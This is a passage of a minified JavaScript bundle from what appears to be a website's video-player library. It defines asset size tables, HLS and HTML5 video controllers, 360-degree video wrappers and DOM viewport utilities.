strict";t.exports=[{width:480,height:200,type:"medium",suffix:"h"},{width:768,height:320,type:"large",suffix:""},{width:960,height:400,type:"large",suffix:""},{width:1536,height:640,type:"large",suffix:"h"},{width:1536,height:640,type:"large",suffix:"l"},{width:1920,height:800,type:"large",suffix:"l"},{width:1920,height:800,type:"large",suffix:"h"}]},{}],395:[function(e,t,n){"use strict";t.exports=[{width:640,height:360,type:"medium",suffix:"h"},{width:848,height:480,type:"large",suffix:""},{width:960,height:540,type:"large",suffix:""},{width:1280,height:720,type:"large",suffix:"h"},{width:1280,height:720,type:"large",suffix:"l"},{width:1920,height:1080,type:"large",suffix:"l"},{width:1920,height:1080,type:"large",suffix:"h"}]},{}],396:[function(e,t,n){"use strict";t.exports=[{width:812,height:375,type:"medium",suffix:"h"},{width:1082,height:500,type:"large",suffix:""},{width:1218,height:563,type:"large",suffix:""},{width:1624,height:750,type:"large",suffix:"h"},{width:1624,height:750,type:"large",suffix:"l"},{width:2436,height:1126,type:"large",suffix:"l"},{width:2436,height:1126,type:"large",suffix:"h"}]},{}],397:[function(e,t,n){"use strict";t.exports=[{width:480,height:480,type:"medium",suffix:""},{width:540,height:540,type:"medium",suffix:""},{width:720,height:720,type:"large",suffix:"h"},{width:720,height:720,type:"large",suffix:"l"},{width:1080,height:1080,type:"large",suffix:"l"},{width:1080,height:1080,type:"large",suffix:"h"}]},{}],398:[function(e,t,n){"use strict";var i=e("@marcom/ac-string/supplant"),r=/_r[0-9].+\.mov$/,o=/_[0-9]+x[0-9].+\.mp4$/,s=/_[0-9]+x[0-9].+\.(mp4|m3u8)$/,a=/_[0-9]+x[0-9]*.+\.(mp4|m3u8)/,c=/_([0-9]+)x([0-9]+)/,l=/-tpl-.*-/,u=/-cc-[a-z].*-/,h=/-tft-.*-/,d=e("./1X1AssetSizes"),p=e("./16X9AssetSizes"),f=e("./12X5AssetSizes"),m=e("./19X9AssetSizes"),_=function(e,t){return e.find((function(e){return e.width===t.width&&(e.height=t.height)||e.width===t.height&&(e.height=t.width)}))};t.exports={getVideoSource:function(e,t,n,a){var l,u;c.test(e);var v,g={};if(g.width=parseInt(RegExp.$1,10),g.height=parseInt(RegExp.$2,10),e.match(h))l=f,u=1536;else if(g.width===g.height)l=d,u=1080;else if(e.match(r)||_(p,g))l=p,u=1280;else{if(!_(m,g))return e;l=m,u=1624}g.width<g.height&&(v=!0);var y,b=l[0].width,w=a&&a.maxWidth?Math.max(a.maxWidth,b):u;if(!e)throw"Must provide an url to optimize";if(void 0===t||isNaN(t))throw"Must provide a width";0===t&&(t=g.width),n&&(l=l.filter((function(e){return e.type===n}))),w<1920&&(l=l.filter((function(e){return e.width<=w}))),(y=v?l.reduce((function(e,n){return Math.abs(n.height-t)<Math.abs(e.height-t)?n:e})):l.reduce((function(e,n){return Math.abs(n.width-t)<Math.abs(e.width-t)?n:e}))).extension=e.indexOf(".m3u8")>=0?"m3u8":"mp4";var E="_{width}x{height}{suffix}.{extension}";v&&(E="_{height}x{width}{suffix}.{extension}");var k=o;return a&&a.urlOptimizeHls&&(k=s),e.match(k)?e.replace(k,i(E,y)):e.match(r)?e.replace(r,i(E,y)):e},getCaptionsSource:function(e){return e.match(u)?e.match(o)?{src:e.replace(o,"_cc.vtt"),srclang:"en"}:e.match(r)?{src:e.replace(r,"_cc.vtt"),srclang:"en"}:null:null},getThumbnailImageSource:function(e){return e.match(l)?{url:e.replace(a,"_thumbnails.jpg")}:null}}},{"./12X5AssetSizes":394,"./16X9AssetSizes":395,"./19X9AssetSizes":396,"./1X1AssetSizes":397,"@marcom/ac-string/supplant":300}],399:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},o=window.Hls,s=e("@marcom/ac-console/log"),a=e("../utils/liveStreamLookback"),c=e("../utils/loadScript"),l=function(e){function t(e){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var n=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e));return n._src=null,n._hlsUrl=e.hlsUrl||"/ac/libs/hls.js/2.162.3/hls.js",n._hlsConfig=e.hlsConfig||{},n._initialize(e),n}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_initialize",value:function(e){var t=this;void 0===o&&(this._deferredQueue=[],c(this._hlsUrl).then((function(){o=window.Hls,t._initialize(e),t._deferredQueue.forEach((function(e){e()})),t._deferredQueue=null}))),this._debugHls=e.debugHls,this._enablePerformanceLogging=e.enablePerformanceLogging,this._onHlsError=this._onHlsError.bind(this),this._onDesiredRateChanged=this._onDesiredRateChanged.bind(this),this._onPlay=this._onPlay.bind(this),this.on("play",this._onPlay)}},{key:"_initHls",value:function(){if(this._hls){this._cachedVisibleTracks=Array.from(this.el.textTracks).filter((function(e){return"showing"===e.mode})),this._hls.off(o.Events.ERROR,this._onHlsError),this._hls.off(o.Events.DESIRED_RATE_CHANGED,this._onDesiredRateChanged),this._hls.destroy();var e=this.el.cloneNode(!1),t=this.el.muted;this.el.parentElement.replaceChild(e,this.el),this.replaceElement(e),this.el.muted=t,this.getTextTracksEventEmitter().replaceElement(this.el.textTracks)}var n=Object.assign({},o.DefaultConfig.fragLoadPolicy);n.default=Object.assign({},n.default),n.default.reportCDNServer=!1,this._hls=new o(Object.assign({debug:this._debugHls,enableWorker:!0,condenseSubtitleTrack:!0,enableStreaming:!0,autoRecoverError:!0,enablePerformanceLogging:this._enablePerformanceLogging||!1,fragLoadPolicy:n},this._hlsConfig))}},{key:"load",value:function(e,t){if(o){this._initHls(),this._hls.on(o.Events.ERROR,this._onHlsError),this._hls.on(o.Events.DESIRED_RATE_CHANGED,this._onDesiredRateChanged),this._hls.on(o.Events.AUDIO_TRACK_SWITCHED,this._forwardAudioTrackChangeEvent),this._src=e[0];var n=function(){this._mediaAttached=!0,this._hls.off(o.Events.MEDIA_ATTACHED,n),this.setSrc(e[0]),this._createTextTrackTags(t)}.bind(this);this._hls.on(o.Events.MEDIA_ATTACHED,n),this._hls.attachMedia(this.el)}else this._deferredQueue.push(this.load.bind(this,e,t))}},{key:"setSrc",value:function(e){o?(this._hls||this._initHls(),this._src=e,this._manifestParsed=!1,this._hls.loadSource(e,{appData:{}}),this._hls.on(o.Events.MANIFEST_PARSED,this._boundManifestParsed=function(){this._manifestParsed=!0,this._hls.off(o.Events.MANIFEST_PARSED,this._boundManifestParsed),this._shouldPlay&&this.play()}.bind(this))):this._deferredQueue.push(this.setSrc.bind(this,e))}},{key:"getCurrentTime",value:function(){var e=r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"getCurrentTime",this).call(this);return e<.1?0:e}},{key:"getCurrentSrc",value:function(){return this._src}},{key:"canPlayType",value:function(e){return"vnd.apple.mpegURL"===e?r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"canPlayType",this).call(this,"video/mp4"):r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"canPlayType",this).call(this,e)}},{key:"_playPromiseRejected",value:function(){this._hls&&void 0!==this._hls.desiredRate&&(this._hls.desiredRate=0),r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_playPromiseRejected",this).call(this)}},{key:"_onPlay",value:function(){this._hls&&0===this._hls.desiredRate&&(this._hls.desiredRate=1)}},{key:"getError",value:function(){return this.el.error||this._error}},{key:"getAudioTracks",value:function(){if(this._hls&&this._hls.audioTracks){var e=this._hls,n=e.audioSelectedPersistentID;return this._hls.audioTracks.map((function(t,i){var r={enabled:e.audioMediaOptions[i].MediaSelectionOptionsPersistentID===n,label:t.name,kind:t.characteristics.some((function(e){return"public.accessibility.describes-video"===e}))?"description":"main",language:t.lang,_hlsTrack:t};return Object.defineProperty(r,"enabled",{get:function(){return e.audioMediaOptions[i].MediaSelectionOptionsPersistentID===n},set:function(t){t&&(e.audioSelectedPersistentID=e.audioMediaOptions[i].MediaSelectionOptionsPersistentID)}}),r}))}return r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"getAudioTracks",this).call(this)}},{key:"destroy",value:function(){this.off("play",this._onPlay),r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"destroy",this).call(this),this._hls&&(this._hls.off(o.Events.AUDIO_TRACK_SWITCHED,this._forwardAudioTrackChangeEvent),this._hls.off(o.Events.AUDIO_TRACKS_UPDATED,this._forwardAudioTrackChangeEvent),this._hls.destroy(),this._hls=null)}},{key:"_onHlsError",value:function(e,t){!0===t.fatal&&("fragLoadError"===t.details?s("HLS JS threw a fatal fragLoadError error, but we'll try to let it recover because it probably can if the network/stream recovers"):(this._error=t.type,this.trigger("error",t)))}},{key:"_onDesiredRateChanged",value:function(e){0===this._hls.desiredRate?this.trigger("pause"):this.trigger("play")}},{key:"play",value:function(){this._shouldPlay=!0,this._manifestParsed&&(this._mediaAttached||this.load([this._src]),r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"play",this).call(this))}},{key:"pause",value:function(){this._shouldPlay=!1,r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"pause",this).call(this)}},{key:"getPaused",value:function(){return this._hls&&void 0!==this._hls.desiredRate?0===this._hls.desiredRate:r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"getPaused",this).call(this)}},{key:"isStalled",value:function(){return void 0!==this._hls.desiredRate&&1===this._hls.desiredRate&&this._hls.desiredRate!==this._hls.effectiveRate||r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"isStalled",this).call(this)}},{key:"goToLive",value:function(){this.setCurrentTime(Math.max(this._hls.liveSyncPosition,this.getDuration()-a/2))}}]),t}(e("./HTML5Video"));t.exports=l},{"../utils/liveStreamLookback":390,"../utils/loadScript":391,"./HTML5Video":400,"@marcom/ac-console/log":69}],400:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=e("../dom-emitter/DOMEmitterMicro"),o=e("../texttracks/createTextTracks"),s=e("@marcom/ac-console/log"),a=window.document,c=e("@marcom/useragent-detect").browser.safari?4:3,l=function(e){function t(e){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var n=e&&e.mediaElement?e.mediaElement:a.createElement("video"),i=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,n));return i.el=n,i.options=e||{},i._textTracks=o(e),i._initElement(),i._forwardAudioTrackChangeEvent=i._forwardAudioTrackChangeEvent.bind(i),i._forwardCaptionEvent=i._forwardCaptionEvent.bind(i),i._onTextTrackChangeAfterLoad=i._onTextTrackChangeAfterLoad.bind(i),i._textTracksEmitter=i.getTextTracksEventEmitter(),i._textTracksEmitter.on("addtrack",i._onTextTrackChangeAfterLoad),i._textTracksEmitter.on("addtrack",i._forwardCaptionEvent),i._textTracksEmitter.on("change",i._forwardCaptionEvent),i._textTracksEmitter.on("removetrack",i._forwardCaptionEvent),i.el.audioTracks&&(i.el.audioTracks.addEventListener("addtrack",i._forwardAudioTrackChangeEvent),i.el.audioTracks.addEventListener("removetrack",i._forwardAudioTrackChangeEvent),i.el.audioTracks.addEventListener("change",i._forwardAudioTrackChangeEvent)),i}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_initElement",value:function(){this.el.classList.add("ac-video-media-controller"),null!==this.options.crossorigin&&this.el.setAttribute("crossorigin",this.options.crossorigin?this.options.crossorigin:"anonymous"),this.el.setAttribute("preload",this.options.preload||"auto"),this.el.setAttribute("x-webkit-airplay","")}},{key:"_forwardCaptionEvent",value:function(e){this.trigger(e.type)}},{key:"_forwardAudioTrackChangeEvent",value:function(e){this.trigger("AudioTrackChange")}},{key:"load",value:function(e,t,n){n&&(e=e.map((function(e){return e+"#t="+n}))),this.el.textTracks.length&&(this._cachedVisibleTracks=Array.from(this.el.textTracks).filter((function(e){return"showing"===e.mode}))),this._createSourceTags(e),this._createTextTrackTags(t),this.el.load()}},{key:"_createSourceTags",value:function(e){this.el.removeAttribute("src"),this.el.innerHTML="";var t=0,n=e.length;for(n&&this.el.setAttribute("src",e[0]);t<n;t++){var i=a.createElement("source");i.src=e[t],this.el.appendChild(i)}}},{key:"_playPromiseRejected",value:function(){this.trigger("PlayPromiseError")}},{key:"play",value:function(){try{var e=this.el.play();e&&"function"==typeof e.catch&&(e.catch(function(t){this._playPromise===e&&this._playPromiseRejected()}.bind(this)),e.then(function(){this.trigger("PlayPromiseResolved")}.bind(this),(function(e){s(e)}))),this._playPromise=e}catch(e){s(e)}}},{key:"refreshSize",value:function(){}},{key:"pause",value:function(){this._playPromise=null,this.el.pause()}},{key:"addTextTrack",value:function(e){this._addTextTrackTag(e)}},{key:"removeTextTrack",value:function(e){this._removeTextTrackTag(e)}},{key:"getRenderElement",value:function(){return this.getMediaElement()}},{key:"getMediaElement",value:function(){return this.el}},{key:"_createTextTrackTags",value:function(){return this._textTracks.create.apply(this,arguments)}},{key:"_addTextTrackTag",value:function(){return this._textTracks.add.apply(this,arguments)}},{key:"_removeTextTrackTag",value:function(){return this._textTracks.remove.apply(this,arguments)}},{key:"getTextTracks",value:function(){return this._textTracks.get.apply(this,arguments)}},{key:"getTextTracksEventEmitter",value:function(){return this._textTracks.getEmitter.apply(this,arguments)}},{key:"getAudioTracks",value:function(){return this.el.audioTracks||[]}},{key:"getReadyState",value:function(){return this.el.readyState}},{key:"getPreload",value:function(){return this.el.preload}},{key:"setPreload",value:function(e){return this.el.preload=e}},{key:"setPoster",value:function(e){e?this.el.poster=e:this.el.removeAttribute("poster")}},{key:"getVolume",value:function(){return this.el.volume}},{key:"getMuted",value:function(){return this.el.muted}},{key:"getPaused",value:function(){return this.el.paused}},{key:"getCurrentTime",value:function(){return this.el.currentTime}},{key:"getDuration",value:function(){return this.el.duration}},{key:"setCurrentTime",value:function(e){return this.el.currentTime=e}},{key:"setVolume",value:function(e){return this.el.volume=e}},{key:"setMuted",value:function(e){this.el.muted=e,e?this.el.setAttribute("muted",""):this.el.removeAttribute("muted")}},{key:"getEnded",value:function(){return this.el.ended}},{key:"getError",value:function(){return this.el.error}},{key:"setSrc",value:function(e){this.el.childNodes.length&&e===this._getSrcNode().url||this._createSourceTags([e])}},{key:"advanceLiveStream",value:function(){}},{key:"getCurrentSrc",value:function(){return this.el.src}},{key:"_getSrcNode",value:function(){return this.el.childNodes[0]}},{key:"_onTextTrackChangeAfterLoad",value:function(){var e=this;if(this._cachedVisibleTracks){if(!this._cachedVisibleTracks.length){var t=!0,n=!1,i=void 0;try{for(var r,o=Array.from(this.el.textTracks)[Symbol.iterator]();!(t=(r=o.next()).done);t=!0)r.value.mode="hidden"}catch(e){n=!0,i=e}finally{try{!t&&o.return&&o.return()}finally{if(n)throw i}}}this._cachedVisibleTracks.forEach((function(t){var n=Array.from(e.el.textTracks).find((function(e){return t.language===e.language}));n&&(n.mode="showing")}))}this.trigger("TextTrackChange")}},{key:"setControls",value:function(e){e?(this.el.setAttribute("controls",""),this.el.removeAttribute("aria-hidden")):(this.el.removeAttribute("controls"),this.el.setAttribute("aria-hidden","true"))}},{key:"isFullscreen",value:function(){return this.el.webkitDisplayingFullscreen}},{key:"supportsPictureInPicture",value:function(){return"function"==typeof this.el.webkitSetPresentationMode}},{key:"isPictureInPicture",value:function(){return"picture-in-picture"===this.el.webkitPresentationMode}},{key:"setPictureInPicture",value:function(e){this.supportsPictureInPicture()&&this.el.webkitSetPresentationMode(e?"picture-in-picture":"inline")}},{key:"supportsAirPlay",value:function(){return!!window.WebKitPlaybackTargetAvailabilityEvent}},{key:"canPlayType",value:function(e){return this.el.canPlayType(e)}},{key:"getBuffered",value:function(){return this.el.buffered}},{key:"isStalled",value:function(){return this.getReadyState()<c}},{key:"destroy",value:function(){this._playPromise=null,this._textTracksEmitter&&(this._textTracksEmitter.off("addtrack",this._forwardCaptionEvent),this._textTracksEmitter.off("addtrack",this._onTextTrackChangeAfterLoad),this._textTracksEmitter.off("change",this._forwardCaptionEvent),this._textTracksEmitter.off("removetrack",this._forwardCaptionEvent)),this.el.audioTracks&&this.el.audioTracks.removeEventListener("change",this._forwardAudioTrackChangeEvent),this._textTracks&&this._textTracks.destroy.call(this),this._textTracks=null,this._textTracksEmitter=null,this.el=null}}]),t}(r);t.exports=l},{"../dom-emitter/DOMEmitterMicro":309,"../texttracks/createTextTracks":324,"@marcom/ac-console/log":69,"@marcom/useragent-detect":435}],401:[function(e,t,n){"use strict";var i=e("./HTML5Video"),r=e("./ThreeSixtyVideoBase"),o=function(e){function t(e){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var n=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e));return n._super=i.prototype,n._init(e),n}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),t}(i),s=!0,a=!1,c=void 0;try{for(var l,u=Object.getOwnPropertyNames(r.prototype)[Symbol.iterator]();!(s=(l=u.next()).done);s=!0){var h=l.value;"constructor"!==h&&(o.prototype[h]=r.prototype[h])}}catch(e){a=!0,c=e}finally{try{!s&&u.return&&u.return()}finally{if(a)throw c}}t.exports=o},{"./HTML5Video":400,"./ThreeSixtyVideoBase":402}],402:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=e("@marcom/ac-360"),o=function(){function e(){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e)}return i(e,[{key:"_init",value:function(e){this._renderElement=document.createElement("div"),this._renderElement.classList.add("threesixty-video-container"),this.el.style.visibility="hidden",this.el.style.opacity=0,this.sendMouseDown=this.sendMouseDown.bind(this),this._renderElement.appendChild(this.el),this._init360()}},{key:"_init360",value:function(){this._ac360=new r({el:this._renderElement,src:this.getMediaElement()}),this._ac360.on("error",function(){this._error="360_ERROR",this.trigger("error")}.bind(this)),this._loadOnInit&&(this.load.apply(this,function(e){if(Array.isArray(e)){for(var t=0,n=Array(e.length);t<e.length;t++)n[t]=e[t];return n}return Array.from(e)}(this._loadOnInit)),this._loadOnInit=null)}},{key:"load",value:function(){this._ac360?(this._ac360.setPos(0,0),this._super.load.apply(this,arguments)):this._loadOnInit=arguments}},{key:"play",value:function(){this.getEnded()&&this._ac360.setPos(0,0),this._super.play.apply(this)}},{key:"sendMouseDown",value:function(e){this._ac360.sendMouseDown(e)}},{key:"getRenderElement",value:function(){return this._renderElement}},{key:"get360",value:function(){return this._ac360}},{key:"setControls",value:function(e){this._super.setControls.apply(this,arguments)}},{key:"supportsPictureInPicture",value:function(){return!1}},{key:"supportsAirPlay",value:function(){return!1}},{key:"refreshSize",value:function(){this._ac360&&this._ac360.refreshSize()}},{key:"getError",value:function(){return this._error||this._super.getError.apply(this)}}]),e}();t.exports=o},{"@marcom/ac-360":14}],403:[function(e,t,n){"use strict";var i=e("./HLSVideo"),r=e("./ThreeSixtyVideoBase"),o=function(e){function t(e){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var n=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e));return n._super=i.prototype,n._init(e),n}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),t}(i),s=!0,a=!1,c=void 0;try{for(var l,u=Object.getOwnPropertyNames(r.prototype)[Symbol.iterator]();!(s=(l=u.next()).done);s=!0){var h=l.value;"constructor"!==h&&(o.prototype[h]=r.prototype[h])}}catch(e){a=!0,c=e}finally{try{!s&&u.return&&u.return()}finally{if(a)throw c}}t.exports=o},{"./HLSVideo":399,"./ThreeSixtyVideoBase":402}],404:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=e("./HLSVideo"),o=e("./ThreeSixtyVideo"),s=e("./ThreeSixtyVideoHls"),a=e("./HTML5Video"),c=e("@marcom/useragent-detect"),l=c.browser.safari||c.browser.edge,u="MediaSource"in window&&!c.browser.edge&&!c.os.ios;function h(e){return(e.hls||function(e){return e.src&&-1!==e.src.indexOf(".m3u8")||e.sources&&e.sources[0]&&-1!==e.sources[0].indexOf(".m3u8")}(e))&&!(l&&!1!==e.useNativeHls&&!e.dvr)&&u}var d=function(){function e(){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e)}return i(e,[{key:"create",value:function(e,t){if(h(e)&&!e.threesixty)return new r(Object.assign({},e,{parentElement:t}));if(e.threesixty){var n=o;return h(e)&&(n=s),new n(Object.assign({},e,{parentElement:t}))}return new a(Object.assign({},e,{parentElement:t}))}}]),e}();t.exports=new d},{"./HLSVideo":399,"./HTML5Video":400,"./ThreeSixtyVideo":401,"./ThreeSixtyVideoHls":403,"@marcom/useragent-detect":435}],405:[function(e,t,n){"use strict";t.exports={getContentDimensions:e("./getContentDimensions"),getDimensions:e("./getDimensions"),getMaxScrollPosition:e("./getMaxScrollPosition"),getPagePosition:e("./getPagePosition"),getPercentInViewport:e("./getPercentInViewport"),getPixelsInViewport:e("./getPixelsInViewport"),getPosition:e("./getPosition"),getScrollPosition:e("./getScrollPosition"),getViewportPosition:e("./getViewportPosition"),isInViewport:e("./isInViewport")}},{"./getContentDimensions":406,"./getDimensions":407,"./getMaxScrollPosition":408,"./getPagePosition":409,"./getPercentInViewport":410,"./getPixelsInViewport":411,"./getPosition":412,"./getScrollPosition":413,"./getViewportPosition":414,"./isInViewport":415}],406:[function(e,t,n){"use strict";t.exports=function(e,t){var n=1;return t&&(n=e.getBoundingClientRect().width/e.offsetWidth),{width:e.scrollWidth*n,height:e.scrollHeight*n}}},{}],407:[function(e,t,n){"use strict";t.exports=function(e,t){var n;return t?{width:(n=e.getBoundingClientRect()).width,height:n.height}:{width:e.offsetWidth,height:e.offsetHeight}}},{}],408:[function(e,t,n){"use strict";function i(e,t){return"x"===t?e.scrollWidth-e.clientWidth:e.scrollHeight-e.clientHeight}t.exports=function(e,t){var n=typeof e;return t="string"===n?e:t,e=e&&"string"!==n&&e!==window?e:document.documentElement,t&&/^[xy]$/i.test(t)?i(e,t):{x:i(e,"x"),y:i(e,"y")}}},{}],409:[function(e,t,n){"use strict";var i=e("./getDimensions"),r=e("./getScrollPosition");t.exports=function(e,t){var n;if(t){var o=r(),s=e.getBoundingClientRect();n={top:s.top+o.y,right:s.right+o.x,bottom:s.bottom+o.y,left:s.left+o.x}}else{var a=i(e);for(n={top:e.offsetTop,right:a.width,bottom:a.height,left:e.offsetLeft};e=e.offsetParent;)n.top+=e.offsetTop,n.left+=e.offsetLeft;n.right+=n.left,n.bottom+=n.top}var c=document.documentElement.offsetTop,l=document.documentElement.offsetLeft;return{top:n.top+c,right:n.right+l,bottom:n.bottom+c,left:n.left+l}}},{"./getDimensions":407,"./getScrollPosition":413}],410:[function(e,t,n){"use strict";var i=e("./getDimensions"),r=e("./getPixelsInViewport");t.exports=function(e,t){var n=r(e,t),o=i(e,t);return{x:n.x/o.width,y:n.y/o.height}}},{"./getDimensions":407,"./getPixelsInViewport":411}],411:[function(e,t,n){"use strict";var i=e("./getViewportPosition");t.exports=function(e,t){var n=window.innerWidth,r=window.innerHeight,o=i(e,t),s={x:o.right-o.left,y:o.bottom-o.top};return o.top<0&&(s.y+=o.top),o.bottom>r&&(s.y-=o.bottom-r),o.left<0&&(s.x+=o.left),o.right>n&&(s.x-=o.right-n),s.x=s.x<0?0:s.x,s.y=s.y<0?0:s.y,s}},{"./getViewportPosition":414}],412:[function(e,t,n){"use strict";var i=e("./getDimensions");t.exports=function(e,t){var n,r,o,s,a,c,l;return t?(r=(n=e.getBoundingClientRect()).top,o=n.left,s=n.width,a=n.height,e.offsetParent&&(r-=(c=e.offsetParent.getBoundingClientRect()).top,o-=c.left)):(l=i(e,t),r=e.offsetTop,o=e.offsetLeft,s=l.width,a=l.height),{top:r,right:o+s,bottom:r+a,left:o}}},{"./getDimensions":407}],413:[function(e,t,n){"use strict";function i(e){return"x"===e?window.scrollX||window.pageXOffset:window.scrollY||window.pageYOffset}function r(e,t,n){return"x"===t?n?i("x"):e.scrollLeft:n?i("y"):e.scrollTop}t.exports=function(e,t){var n=typeof e;t="string"===n?e:t;var i=(e=e&&"string"!==n?e:window)===window;return t&&/^[xy]$/i.test(t)?r(e,t,i):{x:r(e,"x",i),y:r(e,"y",i)}}},{}],414:[function(e,t,n){"use strict";var i=e("./getPagePosition"),r=e("./getScrollPosition");t.exports=function(e,t){var n;if(t)return{top:(n=e.getBoundingClientRect()).top,right:n.right,bottom:n.bottom,left:n.left};n=i(e);var o=r();return{top:n.top-o.y,right:n.right-o.x,bottom:n.bottom-o.y,left:n.left-o.x}}},{"./getPagePosition":409,"./getScrollPosition":413}],415:[function(e,t,n){"use strict";var i=e("./getPercentInViewport"),r=e("./getDimensions");t.exports=function(e,t,n){var o=i(e,t);return n=function(e,t,n){var i={x:0,y:0};if(!t)return i;var o,s=typeof t;return t="number"===s||"string"===s?{x:t,y:t}:Object.assign(i,t),Object.keys(i).forEach((function(i){var s=t[i];("string"==typeof s||s>1)&&(o=o||r(e,n),s=(parseInt(s,10)||0)/("x"===i?o.width:o.height)),t[i]=s})),t}(e,n,t),o.y>0&&o.y>=n.y&&o.x>0&&o.x>=n.x}},{"./getDimensions":407,"./getPercentInViewport":410}],416:[function(e,t,n){arguments[4][165][0].apply(n,arguments)},{dup:165}],417:[function(e,t,n){arguments[4][168][0].apply(n,arguments)},{dup:168}],418:[function(e,t,n){arguments[4][169][0].apply(n,arguments)},{"./isNode":417,dup:169}],419:[function(e,t,n){"use strict";var i=e("@marcom/ac-dom-nodes/isNodeType"),r=e("./internal/validate"),o=e("@marcom/ac-dom-nodes/NODE_TYPES").ELEMENT;t.exports=function(e,t,n,s){if(r.childNode(e,"ancestors"),r.selector(t,"ancestors"),n&&i(e,o)&&(!t||e.matches(t)))return e;if(e!==(s=s||document.body))for(;(e=e.parentNode)&&i(e,o);){if(!t||e.matches(t))return e;if(e===s)break}return null}},{"./internal/validate":421,"@marcom/ac-dom-nodes/NODE_TYPES":416,"@marcom/ac-dom-nodes/isNodeType":418}],420:[function(e,t,n){"use strict";var i=e("@marcom/ac-dom-nodes/isNodeType"),r=e("./internal/validate"),o=e("@marcom/ac-dom-nodes/NODE_TYPES").ELEMENT;t.exports=function(e,t,n,s){var a=[];if(r.childNode(e,"ancestors"),r.selector(t,"ancestors"),n&&i(e,o)&&(!t||e.matches(t))&&a.push(e),e!==(s=s||document.body))for(;(e=e.parentNode)&&i(e,o)&&(t&&!e.matches(t)||a.push(e),e!==s););return a}},{"./internal/validate":421,"@marcom/ac-dom-nodes/NODE_TYPES":416,"@marcom/ac-dom-nodes/isNodeType":418}],421:[function(e,t,n){"use strict";var i=e("@marcom/ac-dom-nodes/isNodeType"),r=e("@marcom/ac-dom-nodes/NODE_TYPES"),o=r.COMMENT,s=r.DOCUMENT_FRAGMENT,a=r.DOCUMENT,c=r.ELEMENT,l=r.TEXT,u=[c,a,s],h=[c,l,o];t.exports={parentNode:function(e,t){if(!e||!i(e,u))throw new TypeError(t+": node must be an Element, Document, or Document Fragment")},childNode:function(e,t){if(!e||!i(e,h))throw new TypeError(t+": node must be an Element, TextNode, or Comment")},selector:function(e,t,n){if(n="boolean"==typeof n&&n,(e||n)&&"string"!=typeof e)throw new TypeError(t+": selector must be a 